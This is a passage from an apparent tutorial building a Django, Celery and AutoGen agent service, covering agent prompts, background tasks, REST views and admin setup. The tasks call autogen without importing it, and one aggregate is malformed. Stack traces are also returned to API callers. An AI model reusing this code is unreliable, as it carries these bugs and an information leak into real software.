- Maintain a consistent tone and personality
- Ask questions when needed for clarification
- Acknowledge when you don't know something
- Structure complex information clearly

Your goal is to provide an engaging, helpful, and informative conversation experience.""",

        "generic": """You are a versatile assistant agent capable of handling a wide range of tasks. You can provide information, answer questions, offer suggestions, and assist with various needs.

Your capabilities:
1. Answer questions across diverse domains
2. Provide explanations and clarifications
3. Offer suggestions and recommendations
4. Help with planning and organization
5. Assist with creative tasks
6. Engage in thoughtful discussion

When assisting:
- Understand the core request or question
- Provide clear, accurate, and helpful responses
- Consider the context and intent behind questions
- Structure your responses logically
- Be honest about your limitations
- Maintain a helpful and supportive tone

Your goal is to be a versatile, reliable, and helpful assistant.""",

        "writer": """You are an expert writing agent who specializes in creating clear, engaging, and well-structured content. Your strength is in adapting your writing style to different purposes and audiences.

Your capabilities:
1. Create clear and engaging content in various formats
2. Adapt writing style to different audiences and purposes
3. Structure content logically and coherently
4. Edit and refine existing content
5. Ensure grammar, spelling, and stylistic consistency
6. Generate creative and original content

When writing:
- Consider the purpose, audience, and context
- Organize information with a clear structure
- Use appropriate tone, style, and vocabulary
- Create engaging introductions and conclusions
- Use transitions to guide readers through the content
- Revise for clarity, conciseness, and impact

Your goal is to produce high-quality written content that effectively communicates ideas to the intended audience.""",

        "data_processor": """You are an expert data processing agent who specializes in preparing, cleaning, and transforming data for analysis. Your strength is in handling raw data and making it ready for meaningful analysis.

Your capabilities:
1. Clean and normalize messy datasets
2. Handle missing, duplicate, or inconsistent data
3. Transform data into appropriate formats
4. Merge and join datasets from multiple sources
5. Create derived features and variables
6. Identify and address data quality issues

When processing data:
- First assess the data structure and quality
- Identify issues that need to be addressed
- Apply appropriate cleaning and transformation methods
- Document all changes made to the original data
- Validate the processed data for accuracy
- Prepare the data in a format suitable for analysis

Your goal is to transform raw data into a clean, consistent, and analysis-ready format.""",

        "visualization": """You are an expert data visualization agent who specializes in creating effective visual representations of data. Your strength is in selecting and designing visualizations that clearly communicate insights.

Your capabilities:
1. Select appropriate visualization types for different data
2. Design clear, informative visual representations
3. Highlight key patterns, trends, and relationships in data
4. Create accessible and intuitive visualizations
5. Adapt visualizations for different audiences
6. Combine multiple visualizations into dashboards

When creating visualizations:
- Consider the data type and relationships to visualize
- Select the most appropriate chart or graph type
- Focus on clearly communicating the main insights
- Minimize clutter and maximize data-ink ratio
- Use color, labels, and annotations effectively
- Consider accessibility and interpretability
- Provide clear titles, legends, and context

Your goal is to create visualizations that effectively communicate data insights in an accessible and impactful way.""",

        "report_writer": """You are an expert report writing agent who specializes in creating comprehensive, structured reports that effectively communicate findings and insights. Your strength is in organizing information logically and presenting it clearly.

Your capabilities:
1. Create well-structured reports for different purposes
2. Organize findings and insights logically
3. Present complex information clearly and concisely
4. Integrate data, analysis, and visualizations
5. Adapt content and style to different audiences
6. Highlight key findings and recommendations

When writing reports:
- Consider the purpose, audience, and required detail level
- Create a logical structure with clear sections
- Begin with an executive summary of key points
- Present findings with supporting evidence
- Use visuals to complement and enhance text
- Maintain consistent formatting and style
- Conclude with clear insights and recommendations

Your goal is to produce comprehensive, clear reports that effectively communicate information to the intended audience.""",

        "planner": """You are an expert planning agent who specializes in breaking down complex tasks into organized, achievable steps. Your strength is in creating structured plans that lead to successful outcomes.

Your capabilities:
1. Break down complex tasks into manageable steps
2. Identify dependencies between tasks
3. Estimate time and resources needed
4. Prioritize tasks based on importance and urgency
5. Identify potential risks and mitigation strategies
6. Adapt plans as circumstances change

When planning:
- First understand the overall goal and constraints
- Identify all necessary tasks and subtasks
- Determine logical sequence and dependencies
- Allocate appropriate time and resources
- Highlight critical path items and bottlenecks
- Include checkpoints to assess progress
- Anticipate potential obstacles and plan alternatives

Your goal is to create clear, achievable plans that efficiently lead to successful outcomes.""",

        "executor": """You are an expert execution agent who specializes in implementing plans and completing tasks. Your strength is in taking action, solving problems, and delivering results.

Your capabilities:
1. Implement plans and complete assigned tasks
2. Follow procedures and instructions precisely
3. Solve problems that arise during execution
4. Adapt to changing circumstances
5. Manage resources efficiently
6. Document actions and results

When executing:
- Review and understand the task requirements
- Gather necessary resources and information
- Follow established procedures and best practices
- Address issues promptly as they arise
- Document progress and completed work
- Communicate status and any obstacles clearly
- Verify that outcomes meet requirements

Your goal is to effectively implement plans and deliver high-quality results.""",

        "reviewer": """You are an expert review agent who specializes in evaluating work and providing constructive feedback. Your strength is in assessing quality, identifying issues, and suggesting improvements.

Your capabilities:
1. Evaluate work against established criteria and standards
2. Identify strengths and weaknesses
3. Detect errors, inconsistencies, and problems
4. Ensure compliance with requirements
5. Provide specific, actionable feedback
6. Suggest concrete improvements

When reviewing:
- First understand the requirements and context
- Evaluate objectively against clear criteria
- Be thorough and systematic in your assessment
- Provide balanced feedback on strengths and weaknesses
- Be specific about issues and why they matter
- Suggest clear, actionable improvements
- Maintain a constructive and helpful tone

Your goal is to improve quality through thorough evaluation and constructive feedback.""",
    }
    
    return prompts.get(agent_type, prompts["generic"])
```

Now let's implement the Celery tasks:

```python
# agent_app/tasks.py
import time
import json
import logging
import traceback
from django.utils import timezone
from django.conf import settings
from celery import shared_task
from celery.exceptions import SoftTimeLimitExceeded
from .models import AgentTask, KnowledgeItem, Conversation, Message
from .utils.agent_factory import AgentFactory
from .utils.pinecone_client import PineconeClient

logger = logging.getLogger('agent_app')

@shared_task(bind=True, 
             soft_time_limit=1800,  # 30 minute soft limit
             time_limit=1900,       # ~32 minute hard limit 
             acks_late=True,        # Acknowledge task after execution
             retry_backoff=True,    # Exponential backoff for retries
             max_retries=3)         # Maximum retry attempts
def process_agent_task(self, task_id):
    """
    Process an agent task with the appropriate agent type.
    
    Args:
        task_id (str): UUID of the task to process
    
    Returns:
        dict: Result data
    """
    try:
        # Get task from database
        try:
            task = AgentTask.objects.get(id=task_id)
        except AgentTask.DoesNotExist:
            logger.error(f"Task {task_id} not found")
            return {"error": f"Task {task_id} not found"}
        
        # Update task status
        task.set_processing(self.request.id)
        logger.info(f"Processing task {task_id} of type {task.task_type}")
        
        # Initialize agent factory
        agent_factory = AgentFactory(user_id=task.user.id)
        
        # Process based on task type
        if task.task_type in ['research', 'analysis']:
            # Create a team of agents for complex tasks
            team = agent_factory.create_agent_team(task.input_data)
            result = process_team_task(team, task.input_data)
        else:
            # Create an individual agent
            agent_type = task.input_data.get('agent_type', 'generic')
            context = task.input_data.get('context', {})
            agent = agent_factory.create_agent(agent_type, context)
            
            # Process the task
            result = process_individual_task(agent, task.input_data)
        
        # Extract token usage
        token_usage = result.get('token_usage', {})
        
        # Update task as completed
        task.set_completed(result, token_usage)
        logger.info(f"Task {task_id} completed successfully")
        
        return result
        
    except SoftTimeLimitExceeded:
        # Handle timeout
        logger.error(f"Task {task_id} exceeded time limit")
        try:
            task = AgentTask.objects.get(id=task_id)
            task.set_failed("Task exceeded time limit")
        except Exception as e:
            logger.error(f"Error updating task: {str(e)}")
        
        return {"error": "Task exceeded time limit"}
        
    except Exception as e:
        # Handle other exceptions
        error_msg = str(e)
        stack_trace = traceback.format_exc()
        logger.error(f"Error processing task {task_id}: {error_msg}\n{stack_trace}")
        
        try:
            task = AgentTask.objects.get(id=task_id)
            task.set_failed(f"{error_msg}\n{stack_trace}")
        except Exception as e2:
            logger.error(f"Error updating task status: {str(e2)}")
        
        # Retry for certain exceptions
        if "Rate limit" in error_msg or "timeout" in error_msg.lower():
            raise self.retry(exc=e, countdown=60)
        
        return {"error": error_msg, "stack_trace": stack_trace}

def process_team_task(team, task_data):
    """
    Process a task using a team of agents.
    
    Args:
        team (dict): The team configuration with agents
        task_data (dict): Task data
    
    Returns:
        dict: Result data
    """
    start_time = time.time()
    
    # Extract team components
    user_proxy = team["user_proxy"]
    manager = team["manager"]
    
    # Prepare the task message
    task_description = task_data.get('description', '')
    task_details = task_data.get('details', {})
    
    message = f"Task: {task_description}\n\n"
    
    if task_details:
        message += "Details:\n"
        for key, value in task_details.items():
            message += f"- {key}: {value}\n"
    
    # Start the group conversation
    user_proxy.initiate_chat(
        manager,
        message=message
    )
    
    # Extract results
    chat_history = user_proxy.chat_history
    result_content = None
    
    # Find the final result from the chat history
    for msg in reversed(chat_history):
        if msg.get("role") == "assistant" and len(msg.get("content", "")) > 100:
            result_content = msg.get("content")
            break
    
    # If no clear result is found, summarize the entire conversation
    if not result_content:
        result_content = "No clear result was produced. Here's the conversation summary:\n\n"
        for msg in chat_history:
            if msg.get("role") in ["assistant", "user"]:
                result_content += f"{msg.get('role').upper()}: {msg.get('content', '')[:200]}...\n\n"
    
    # Calculate token usage (estimated)
    total_input_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "user")
    total_output_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "assistant")
    
    duration = time.time() - start_time
    
    return {
        "result": result_content,
        "chat_history": chat_history,
        "duration_seconds": duration,
        "team_composition": [agent.name for agent in team["agents"]],
        "token_usage": {
            "prompt_tokens": int(total_input_tokens),
            "completion_tokens": int(total_output_tokens),
            "total_tokens": int(total_input_tokens + total_output_tokens)
        }
    }

def process_individual_task(agent, task_data):
    """
    Process a task using an individual agent.
    
    Args:
        agent (AssistantAgent): The agent to process the task
        task_data (dict): Task data
    
    Returns:
        dict: Result data
    """
    start_time = time.time()
    
    # Create user proxy agent
    user_proxy = autogen.UserProxyAgent(
        name="TaskUser",
        human_input_mode="NEVER",
        max_consecutive_auto_reply=0
    )
    
    # Prepare the task message
    query = task_data.get('query', '')
    context = task_data.get('context', {})
    
    message = query
    
    if context:
        message += "\n\nContext:\n"
        for key, value in context.items():
            message += f"- {key}: {value}\n"
    
    # Start conversation with agent
    user_proxy.initiate_chat(
        agent,
        message=message
    )
    
    # Get the last message from the agent as the result
    chat_history = user_proxy.chat_history
    result_content = None
    
    for msg in reversed(chat_history):
        if msg.get("role") == "assistant":
            result_content = msg.get("content")
            break
    
    # Calculate token usage (estimated)
    total_input_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "user")
    total_output_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "assistant")
    
    duration = time.time() - start_time
    
    return {
        "result": result_content,
        "chat_history": chat_history,
        "duration_seconds": duration,
        "agent_type": agent.name,
        "token_usage": {
            "prompt_tokens": int(total_input_tokens),
            "completion_tokens": int(total_output_tokens),
            "total_tokens": int(total_input_tokens + total_output_tokens)
        }
    }

@shared_task(bind=True, 
             soft_time_limit=300,   # 5 minute soft limit
             acks_late=True,
             max_retries=2)
def update_knowledge_base(self, knowledge_item_id):
    """
    Update a knowledge item in the vector database.
    
    Args:
        knowledge_item_id (str): UUID of the knowledge item to update
    
    Returns:
        dict: Result status
    """
    try:
        # Get knowledge item from database
        try:
            item = KnowledgeItem.objects.get(id=knowledge_item_id)
        except KnowledgeItem.DoesNotExist:
            logger.error(f"Knowledge item {knowledge_item_id} not found")
            return {"error": f"Knowledge item {knowledge_item_id} not found"}
        
        logger.info(f"Updating knowledge item {knowledge_item_id} in vector database")
        
        # Initialize Pinecone client
        pinecone_client = PineconeClient()
        
        # Prepare metadata
        metadata = {
            "user_id": str(item.user.id),
            "title": item.title,
            "source": item.source,
            "domain": item.domain,
            "tags": json.dumps(item.tags),
            "confidence": item.confidence,
            "created_at": item.created_at.isoformat()
        }
        
        # Update or create vector
        if item.vector_id:
            # Update existing vector
            success = pinecone_client.update_metadata(item.vector_id, metadata)
            if not success:
                # If update failed, create new vector
                vector_id = pinecone_client.add_item(
                    str(item.id), 
                    item.content, 
                    metadata
                )
                item.vector_id = vector_id
                item.save(update_fields=['vector_id', 'last_updated'])
        else:
            # Create new vector
            vector_id = pinecone_client.add_item(
                str(item.id), 
                item.content, 
                metadata
            )
            item.vector_id = vector_id
            item.save(update_fields=['vector_id', 'last_updated'])
        
        logger.info(f"Knowledge item {knowledge_item_id} updated successfully")
        
        return {
            "status": "success",
            "message": f"Knowledge item {knowledge_item_id} updated",
            "vector_id": item.vector_id
        }
        
    except Exception as e:
        error_msg = str(e)
        stack_trace = traceback.format_exc()
        logger.error(f"Error updating knowledge item {knowledge_item_id}: {error_msg}\n{stack_trace}")
        
        # Retry for certain exceptions
        if "Rate limit" in error_msg or "timeout" in error_msg.lower():
            raise self.retry(exc=e, countdown=30)
        
        return {"error": error_msg, "stack_trace": stack_trace}

@shared_task(bind=True,
             soft_time_limit=600,   # 10 minute soft limit
             acks_late=True,
             max_retries=2)
def analyze_document(self, task_id):
    """
    Analyze a document using a document processor agent.
    
    Args:
        task_id (str): UUID of the task to process
    
    Returns:
        dict: Analysis results
    """
    try:
        # Get task from database
        try:
            task = AgentTask.objects.get(id=task_id)
        except AgentTask.DoesNotExist:
            logger.error(f"Task {task_id} not found")
            return {"error": f"Task {task_id} not found"}
        
        # Update task status
        task.set_processing(self.request.id)
        logger.info(f"Analyzing document for task {task_id}")
        
        # Initialize agent factory
        agent_factory = AgentFactory(user_id=task.user.id)
        
        # Create document processor agent
        context = {
            "document_type": task.input_data.get("document_type", "general")
        }
        agent = agent_factory.create_agent("document_processor", context)
        
        # Extract document text
        document_text = task.input_data.get("document", "")
        if not document_text:
            raise ValueError("No document text provided")
        
        # Create user proxy agent
        user_proxy = autogen.UserProxyAgent(
            name="DocumentUser",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=0
        )
        
        # Prepare analysis instructions
        analysis_type = task.input_data.get("analysis_type", "general")
        
        instructions = f"""Analyze the following document. 

Document type: {context.get('document_type', 'general')}
Analysis type: {analysis_type}

Please provide:
1. A concise summary of the document
2. Key entities and topics mentioned
3. Main points or arguments presented
4. Any notable insights or implications

Document text:
{document_text[:8000]}  # Limit to first 8000 chars to avoid token limits
"""
        
        if len(document_text) > 8000:
            instructions += "\n\n[Note: Document has been truncated due to length. Analysis based on first portion only.]"
        
        # Start conversation with agent
        user_proxy.initiate_chat(
            agent,
            message=instructions
        )
        
        # Get the analysis result
        chat_history = user_proxy.chat_history
        analysis_result = None
        
        for msg in reversed(chat_history):
            if msg.get("role") == "assistant":
                analysis_result = msg.get("content")
                break
        
        # Calculate token usage (estimated)
        total_input_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "user")
        total_output_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "assistant")
        
        # Prepare result data
        result = {
            "analysis": analysis_result,
            "document_type": context.get("document_type"),
            "analysis_type": analysis_type,
            "character_count": len(document_text),
            "token_usage": {
                "prompt_tokens": int(total_input_tokens),
                "completion_tokens": int(total_output_tokens),
                "total_tokens": int(total_input_tokens + total_output_tokens)
            }
        }
        
        # Update task as completed
        task.set_completed(result, result["token_usage"])
        logger.info(f"Document analysis for task {task_id} completed")
        
        return result
        
    except Exception as e:
        error_msg = str(e)
        stack_trace = traceback.format_exc()
        logger.error(f"Error analyzing document for task {task_id}: {error_msg}\n{stack_trace}")
        
        try:
            task = AgentTask.objects.get(id=task_id)
            task.set_failed(f"{error_msg}\n{stack_trace}")
        except Exception as e2:
            logger.error(f"Error updating task status: {str(e2)}")
        
        return {"error": error_msg, "stack_trace": stack_trace}

@shared_task(bind=True)
def periodic_agent_check(self):
    """
    Periodic task to check for stalled agent tasks.
    """
    try:
        # Find tasks that have been processing for too long (1 hour)
        one_hour_ago = timezone.now() - timezone.timedelta(hours=1)
        stalled_tasks = AgentTask.objects.filter(
            status='processing',
            started_at__lt=one_hour_ago
        )
        
        count = stalled_tasks.count()
        logger.info(f"Found {count} stalled tasks")
        
        # Mark tasks as failed
        for task in stalled_tasks:
            task.set_failed("Task stalled - processing timeout exceeded")
            logger.warning(f"Marked task {task.id} as failed due to processing timeout")
        
        return {"status": "success", "stalled_tasks_count": count}
        
    except Exception as e:
        logger.error(f"Error in periodic agent check: {str(e)}")
        return {"status": "error", "message": str(e)}

@shared_task(bind=True)
def process_conversation(self, conversation_id, message_id):
    """
    Process a new message in a conversation.
    
    Args:
        conversation_id (str): UUID of the conversation
        message_id (str): UUID of the message to process
    
    Returns:
        dict: Response data
    """
    try:
        # Get conversation and message from database
        try:
            conversation = Conversation.objects.get(id=conversation_id)
            message = Message.objects.get(id=message_id, conversation=conversation)
        except (Conversation.DoesNotExist, Message.DoesNotExist):
            logger.error(f"Conversation {conversation_id} or message {message_id} not found")
            return {"error": "Conversation or message not found"}
        
        logger.info(f"Processing message {message_id} in conversation {conversation_id}")
        
        # Initialize agent factory
        agent_factory = AgentFactory(user_id=conversation.user.id)
        
        # Create conversation agent
        context = {
            "topic": conversation.topic,
            "tone": "conversational"
        }
        agent = agent_factory.create_agent("conversation", context)
        
        # Get conversation history (last 10 messages)
        history = conversation.messages.order_by('created_at')[:10]
        
        # Prepare conversation context
        conversation_context = ""
        for hist_msg in history:
            if hist_msg.id != message.id:  # Skip the current message
                conversation_context += f"{hist_msg.role.upper()}: {hist_msg.content}\n\n"
        
        # Create user proxy agent
        user_proxy = autogen.UserProxyAgent(
            name="ConversationUser",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=0
        )
        
        # Prepare the message with context
        prompt = f"""This is part of an ongoing conversation. Please respond to the latest message.

Previous conversation:
{conversation_context}

Current message:
USER: {message.content}

Please respond in a helpful, conversational manner."""
        
        # Start conversation with agent
        user_proxy.initiate_chat(
            agent,
            message=prompt
        )
        
        # Get the response from the agent
        chat_history = user_proxy.chat_history
        response_content = None
        
        for msg in reversed(chat_history):
            if msg.get("role") == "assistant":
                response_content = msg.get("content")
                break
        
        if response_content:
            # Create response message
            response = Message.objects.create(
                conversation=conversation,
                role="assistant",
                content=response_content,
                agent_name=agent.name,
                token_count=len(response_content.split()) * 1.3  # Approximate token count
            )
            
            # Update conversation
            conversation.updated_at = timezone.now()
            conversation.save(update_fields=['updated_at'])
            
            logger.info(f"Created response message {response.id} in conversation {conversation_id}")
            
            # Calculate token usage (estimated)
            total_input_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "user")
            total_output_tokens = sum(len(msg.get("content", "").split()) * 1.3 for msg in chat_history if msg.get("role") == "assistant")
            
            return {
                "status": "success",
                "response_id": str(response.id),
                "response_content": response_content,
                "token_usage": {
                    "prompt_tokens": int(total_input_tokens),
                    "completion_tokens": int(total_output_tokens),
                    "total_tokens": int(total_input_tokens + total_output_tokens)
                }
            }
        else:
            logger.error(f"No response generated for message {message_id}")
            return {"error": "No response generated"}
            
    except Exception as e:
        error_msg = str(e)
        stack_trace = traceback.format_exc()
        logger.error(f"Error processing conversation message: {error_msg}\n{stack_trace}")
        
        return {"error": error_msg, "stack_trace": stack_trace}
```

Now, let's implement the API views:

```python
# agent_app/views.py
import uuid
import logging
from django.shortcuts import get_object_or_404
from django.utils import timezone
from django.db.models import Count, Sum, Max, F, ExpressionWrapper, fields
from django.db.models.functions import TruncDay
from rest_framework import viewsets, status, permissions
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework.views import APIView
from .models import AgentTask, KnowledgeItem, Conversation, Message
from .serializers import (
    AgentTaskSerializer, KnowledgeItemSerializer, 
    ConversationSerializer, MessageSerializer,
    ConversationMessageSerializer
)
from .tasks import (
    process_agent_task, update_knowledge_base, 
    analyze_document, process_conversation
)
from .utils.pinecone_client import PineconeClient

logger = logging.getLogger('agent_app')

class AgentTaskViewSet(viewsets.ModelViewSet):
    """ViewSet for managing agent tasks."""
    serializer_class = AgentTaskSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return tasks for the current user."""
        return AgentTask.objects.filter(user=self.request.user).order_by('-created_at')
    
    def create(self, request, *args, **kwargs):
        """Create a new task and queue it for processing."""
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        task = serializer.save()
        
        # Queue the task for processing based on type
        if task.task_type == 'document':
            # Use document-specific task
            result = analyze_document.delay(str(task.id))
        else:
            # Use general task processing
            result = process_agent_task.delay(str(task.id))
        
        # Update task with celery task ID
        task.celery_task_id = result.id
        task.save(update_fields=['celery_task_id'])
        
        headers = self.get_success_headers(serializer.data)
        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)
    
    @action(detail=True, methods=['post'])
    def cancel(self, request, pk=None):
        """Cancel a running task."""
        task = self.get_object()
        
        if task.status not in ['pending', 'processing']:
            return Response(
                {"detail": "Only pending or processing tasks can be canceled."},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Update task status
        task.status = 'canceled'
        task.completed_at = timezone.now()
        task.save(update_fields=['status', 'completed_at', 'updated_at'])
        
        # Could also revoke the Celery task here
        
        return Response({"detail": "Task canceled successfully."})
    
    @action(detail=False, methods=['get'])
    def stats(self, request):
        """Get statistics about tasks."""
        queryset = self.get_queryset()
        
        # Basic counts
        total_tasks = queryset.count()
        completed_tasks = queryset.filter(status='completed').count()
        failed_tasks = queryset.filter(status='failed').count()
        
        # Token usage statistics
        token_stats = queryset.filter(status='completed').aggregate(
            total_prompt_tokens=Sum('prompt_tokens'),
            total_completion_tokens=Sum('completion_tokens'),
            total_tokens=Sum('total_tokens'),
            avg_tokens_per_task=ExpressionWrapper(
                Sum('total_tokens') * 1.0 / Count('id'),
                output_field=fields.FloatField()
            ),
            total_cost=Sum('estimated_cost')
        )
        
        # Task type distribution
        type_distribution = (
            queryset
            .values('task_type')
            .annotate(count=Count('id'))
            .order_by('-count')
        )
        
        # Task creation over time (last 30 days)
        thirty_days_ago = timezone.now() - timezone.timedelta(days=30)
        time_series = (
            queryset
            .filter(created_at__gte=thirty_days_ago)
            .annotate(day=TruncDay('created_at'))
            .values('day')
            .annotate(count=Count('id'))
            .order_by('day')
        )
        
        # Average processing time
        time_stats = queryset.filter(
            status='completed',
            started_at__isnull=False,
            completed_at__isnull=False
        ).aggregate(
            avg_processing_time=ExpressionWrapper(
                (F('completed_at') - F('started_at')) / 1000000,  # Convert microseconds to seconds
                output_field=fields.FloatField()
            )
        )
        
        return Response({
            "total_tasks": total_tasks,
            "completed_tasks": completed_tasks,
            "failed_tasks": failed_tasks,
            "token_stats": token_stats,
            "type_distribution": type_distribution,
            "time_series": time_series,
            "time_stats": time_stats
        })

class KnowledgeItemViewSet(viewsets.ModelViewSet):
    """ViewSet for managing knowledge items."""
    serializer_class = KnowledgeItemSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return knowledge items for the current user."""
        return KnowledgeItem.objects.filter(user=self.request.user).order_by('-created_at')
    
    def create(self, request, *args, **kwargs):
        """Create a new knowledge item and index it."""
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        item = serializer.save()
        
        # Queue indexing task
        update_knowledge_base.delay(str(item.id))
        
        headers = self.get_success_headers(serializer.data)
        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)
    
    def update(self, request, *args, **kwargs):
        """Update a knowledge item and re-index it."""
        partial = kwargs.pop('partial', False)
        instance = self.get_object()
        serializer = self.get_serializer(instance, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        item = serializer.save()
        
        # Queue indexing task
        update_knowledge_base.delay(str(item.id))
        
        return Response(serializer.data)
    
    def destroy(self, request, *args, **kwargs):
        """Delete a knowledge item and remove from index."""
        instance = self.get_object()
        
        # If it has a vector ID, remove from Pinecone
        if instance.vector_id:
            try:
                pinecone_client = PineconeClient()
                pinecone_client.delete_item(instance.vector_id)
            except Exception as e:
                logger.error(f"Error removing item from Pinecone: {str(e)}")
        
        self.perform_destroy(instance)
        return Response(status=status.HTTP_204_NO_CONTENT)
    
    @action(detail=False, methods=['post'])
    def search(self, request):
        """Search knowledge items by semantic similarity."""
        query = request.data.get('query')
        if not query:
            return Response(
                {"detail": "Query is required."},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        filters = request.data.get('filters', {})
        top_k = int(request.data.get('limit', 5))
        
        # Add user filter
        filters["user_id"] = str(request.user.id)
        
        try:
            pinecone_client = PineconeClient()
            results = pinecone_client.search(query, filters, top_k)
            
            # Get item IDs from results
            item_ids = [result['id'] for result in results]
            
            # Fetch full items from database
            items = KnowledgeItem.objects.filter(id__in=item_ids)
            item_dict = {str(item.id): item for item in items}
            
            # Combine database items with search results
            enriched_results = []
            for result in results:
                item = item_dict.get(result['id'])
                if item:
                    enriched_results.append({
                        "id": str(item.id),
                        "title": item.title,
                        "content": item.content,
                        "domain": item.domain,
                        "tags": item.tags,
                        "source": item.source,
                        "created_at": item.created_at.isoformat(),
                        "relevance_score": result['score']
                    })
            
            return Response({
                "results": enriched_results,
                "count": len(enriched_results),
                "query": query
            })
            
        except Exception as e:
            logger.error(f"Error searching knowledge: {str(e)}")
            return Response(
                {"detail": f"Search error: {str(e)}"},
                status=status.HTTP_500_INTERNAL_SERVER_ERROR
            )

class ConversationViewSet(viewsets.ModelViewSet):
    """ViewSet for managing conversations."""
    serializer_class = ConversationSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return conversations for the current user."""
        queryset = Conversation.objects.filter(
            user=self.request.user
        ).order_by('-updated_at')
        
        # Filter by active status if specified
        is_active = self.request.query_params.get('is_active')
        if is_active is not None:
            is_active = is_active.lower() == 'true'
            queryset = queryset.filter(is_active=is_active)
        
        # Filter by topic if specified
        topic = self.request.query_params.get('topic')
        if topic:
            queryset = queryset.filter(topic=topic)
        
        return queryset
    
    @action(detail=True, methods=['post'])
    def add_message(self, request, pk=None):
        """Add a new message to the conversation and get a response."""
        conversation = self.get_object()
        
        serializer = ConversationMessageSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        # Create the message
        message = Message.objects.create(
            conversation=conversation,
            role=serializer.validated_data.get('role', 'user'),
            content=serializer.validated_data['content'],
            token_count=len(serializer.validated_data['content'].split()) * 1.3  # Approximate token count
        )
        
        # Update conversation timestamp
        conversation.updated_at = timezone.now()
        conversation.save(update_fields=['updated_at'])
        
        # Queue task to process the message if it's from the user
        if message.role == 'user':
            process_conversation.delay(str(conversation.id), str(message.id))
        
        # Return the created message
        message_serializer = MessageSerializer(message)
        
        return Response({
            "message": message_serializer.data,
            "status": "processing" if message.role == 'user' else "completed"
        })
    
    @action(detail=True, methods=['get'])
    def messages(self, request, pk=None):
        """Get messages for a conversation with pagination."""
        conversation = self.get_object()
        
        # Get messages with pagination
        messages = conversation.messages.order_by('created_at')
        
        # Get page parameters
        page = self.paginate_queryset(messages)
        if page is not None:
            serializer = MessageSerializer(page, many=True)
            return self.get_paginated_response(serializer.data)
        
        serializer = MessageSerializer(messages, many=True)
        return Response(serializer.data)
    
    @action(detail=True, methods=['post'])
    def archive(self, request, pk=None):
        """Archive a conversation (mark as inactive)."""
        conversation = self.get_object()
        conversation.is_active = False
        conversation.save(update_fields=['is_active', 'updated_at'])
        
        return Response({"status": "success", "detail": "Conversation archived"})

class MessageViewSet(viewsets.ReadOnlyModelViewSet):
    """ViewSet for reading messages (no direct creation/update)."""
    serializer_class = MessageSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Return messages that belong to the current user's conversations."""
        return Message.objects.filter(
            conversation__user=self.request.user
        ).order_by('created_at')
    
    def list(self, request, *args, **kwargs):
        """Messages must be accessed through a conversation."""
        return Response(
            {"detail": "Messages must be accessed through a specific conversation."},
            status=status.HTTP_400_BAD_REQUEST
        )

class VectorDatabaseStatsView(APIView):
    """View for getting vector database statistics."""
    permission_classes = [permissions.IsAuthenticated]
    
    def get(self, request, format=None):
        """Get statistics about the vector database."""
        try:
            pinecone_client = PineconeClient()
            stats = pinecone_client.get_stats()
            
            # Get count of user's knowledge items
            user_items_count = KnowledgeItem.objects.filter(
                user=request.user,
                vector_id__isnull=False
            ).count()
            
            return Response({
                "user_items_count": user_items_count,
                "total_vectors": stats.get("total_vector_count", 0),
                "dimension": stats.get("dimension", 0),
                "namespaces": stats.get("namespaces", {})
            })
            
        except Exception as e:
            logger.error(f"Error getting vector database stats: {str(e)}")
            return Response(
                {"detail": f"Error: {str(e)}"},
                status=status.HTTP_500_INTERNAL_SERVER_ERROR
            )
```

```python
# agent_app/urls.py
from django.urls import path, include
from rest_framework.routers import DefaultRouter
from . import views

router = DefaultRouter()
router.register(r'tasks', views.AgentTaskViewSet, basename='task')
router.register(r'knowledge', views.KnowledgeItemViewSet, basename='knowledge')
router.register(r'conversations', views.ConversationViewSet, basename='conversation')
router.register(r'messages', views.MessageViewSet, basename='message')

urlpatterns = [
    path('', include(router.urls)),
    path('vector-stats/', views.VectorDatabaseStatsView.as_view(), name='vector-stats'),
]
```

Finally, let's create the admin interface:

```python
# agent_app/admin.py
from django.contrib import admin
from .models import AgentTask, KnowledgeItem, Conversation, Message

@admin.register(AgentTask)
class AgentTaskAdmin(admin.ModelAdmin):
    list_display = ('id', 'title', 'user', 'task_type', 'status', 'priority', 'created_at')
    list_filter = ('status', 'task_type', 'priority')
    search_fields = ('title', 'description', 'user__username')
    readonly_fields = ('created_at', 'updated_at', 'started_at', 'completed_at', 'celery_task_id')
    date_hierarchy = 'created_at'

@admin.register(KnowledgeItem)
class KnowledgeItemAdmin(admin.ModelAdmin):
    list_display = ('id', 'title', 'user', 'domain', 'created_at')
    list_filter = ('domain',)
    search_fields = ('title', 'content', 'user__username')
    readonly_fields = ('created_at', 'vector_id', 'last_updated')

@admin.register(Conversation)
class ConversationAdmin(admin.ModelAdmin):
    list_display = ('id', 'title', 'user', 'topic', 'is_active', 'created_at', 'updated_at')
    list_filter = ('is_active', 'topic')
    search_fields = ('title', 'user__username')
    readonly_fields = ('created_at', 'updated_at')

@admin.register(Message)
class MessageAdmin(admin.ModelAdmin):
    list_display = ('id', 'conversation', 'role', 'token_count', 'created_at')
    list_filter = ('role',)
    search_fields = ('content', 'conversation__title')
    readonly_fields = ('created_at',)
```

